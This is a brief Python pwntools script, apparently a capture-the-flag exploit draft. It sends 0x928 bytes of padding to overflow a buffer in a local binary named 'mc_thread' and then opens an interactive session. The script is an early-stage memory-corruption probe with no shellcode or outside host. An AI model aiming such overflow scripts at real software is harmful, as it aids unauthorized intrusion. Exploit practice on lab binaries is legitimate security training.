#! /usr/bin/python3

from pwn import *

p = process("./mc_thread")
e = ELF("./mc_thread")

payload = b'A'*0x928
inp_sz = len(payload)

p.sendlineafter(b'Size: ', str(inp_sz).encode())
p.sendafter(b'Data: ', payload)
p.interactive()